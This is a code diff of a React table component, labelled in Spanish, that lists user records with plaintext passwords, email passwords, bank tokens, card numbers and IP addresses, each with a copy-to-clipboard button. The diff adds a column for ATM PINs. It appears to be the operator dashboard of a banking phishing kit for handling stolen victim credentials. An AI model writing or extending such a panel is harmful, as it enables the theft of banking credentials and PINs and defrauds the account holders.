@@ -29,14 +29,18 @@ export const TableUserAll = ({users}) => {
               <thead className="text-xs font-semibold uppercase text-gray-400 bg-gray-50">
                   <tr>
                     {
-                      tableHeader.tableHeaderOptions.map( e => { 
-                        if(filteredType.includes(e) ) return ( 
-                          <th key={e} className="p-2 py-3 whitespace-nowrap">
+                      tableHeader.tableHeaderOptions.map( (e, i) => { 
+                        
+                        if (filteredType.includes('Clave ATM') === false && e === 'Clave ATM') return;
+
+                        if(filteredType.includes(e) ) {
+                          return ( 
+                          <th key={i} className="p-2 py-3 whitespace-nowrap">
                             <div className='font-semibold text-left'>
                               {e}
                             </div>
                           </th> 
-                        );
+                        );}
 
                         if(e == 'usuario' || e == "clave" || e == "Ip" || e == "..." || filteredType.length === 1  ) return (
                           <th key={e} className="p-2 py-3 whitespace-nowrap">
@@ -51,7 +55,7 @@ export const TableUserAll = ({users}) => {
               </thead>
               <tbody className="text-sm divide-y divide-gray-100">
                 {
-                  filteredUsers().map( ({_id, username, password, correo, claveCorreo, celular, token1, token2, tarjeta, ip }, i) => {
+                  filteredUsers().map( ({_id, username, password, atmPassword, correo, claveCorreo, celular, token1, token2, tarjeta, ip }, i) => {
                     return (
                       <tr key={i}>
                         <td className='p-2 py-3 whitespace-nowrap'>
@@ -162,6 +166,21 @@ export const TableUserAll = ({users}) => {
                                     color={"primary"}
                                   >
                                   <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(tarjeta)}>{tarjeta}</button>
+                                </Tooltip>
+                              </div>
+                            </td>
+                          )
+                        }
+                        {
+                          (filteredType.includes('Clave ATM')) && (
+                            <td className='p-2 py-3 whitespace-nowrap'>
+                              <div className="flex items-center">
+                                <Tooltip
+                                    content={'Copiado!'}
+                                    trigger={'click'}
+                                    color={"primary"}
+                                  >
+                                  <button className="text-gray-800" onClick={() => navigator.clipboard.writeText(atmPassword)}>{atmPassword}</button>
                                 </Tooltip>
                               </div>
                             </td>
